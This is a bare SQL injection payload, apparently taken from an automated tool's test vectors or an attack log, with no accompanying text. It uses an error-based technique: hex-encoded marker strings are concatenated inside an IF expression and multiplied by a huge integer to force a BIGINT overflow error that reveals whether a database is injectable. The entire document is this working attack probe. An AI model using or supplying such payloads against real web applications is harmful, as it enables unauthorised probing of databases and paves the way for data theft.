SELECT 2 * (IF((SELECT *
                FROM (SELECT CONCAT(0x716b626b71,
                                    (SELECT (ELT(9092 = 9092, 1)))
                                 , 0x71626b7071, 0x78)) s), 8446744073709551610, 8446744073709551610))
